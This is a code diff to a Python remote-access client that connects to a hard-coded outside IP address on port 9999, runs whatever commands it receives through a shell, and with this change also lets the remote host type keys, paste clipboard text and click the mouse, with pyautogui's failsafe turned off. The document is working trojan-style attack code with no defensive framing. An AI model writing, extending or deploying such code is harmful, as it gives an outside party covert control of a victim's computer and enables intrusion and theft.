@@ -2,11 +2,13 @@ import socket
 import os
 import subprocess
 import time
+import pyautogui
+import pyperclip
 
 s = socket.socket()
 host = '103.173.227.65'
 port = 9999
-
+pyautogui.FAILSAFE = False
 is_connect = False
 
 
@@ -40,17 +42,35 @@ while True:
                 is_connect = False
                 s = socket.socket()
                 continue
-        data = s.recv(1024)
+        data = s.recv(20480)
+
+        if data[:6].decode("utf-8") == 'pr cpy':
+            key = data[7:].decode()
+            print(f'key : {key} copied')
+            pyperclip.copy(key)
+
+        if data[:6].decode("utf-8") == 'pr pst':
+            pyautogui.hotkey('ctrl', 'v')
+
+        if data[:2].decode("utf-8") == 'pr':
+            key = data[3:].decode("utf-8")[2:-1]
+            print(key)
+            pyautogui.press(key)
+
         if data[:2].decode("utf-8") == 'cd':
             os.chdir(data[3:].decode("utf-8"))
+
+        if data[:2].decode("utf-8") == 'cl':
+            x, y = data[3:].decode("utf-8").split()
+            pyautogui.click(int(x), int(y))
 
         if len(data) > 0:
             print(data)
             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
-            output_byte = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_byte, "utf-8")
-            currentWD = os.getcwd() + "> "
+            # output_byte = cmd.stdout.read() + cmd.stderr.read()
+            # output_str = str(output_byte, "utf-8")
+            # currentWD = os.getcwd() + "> "
             # s.send(str.encode(output_str + currentWD))
             # print(output_str)
     except:
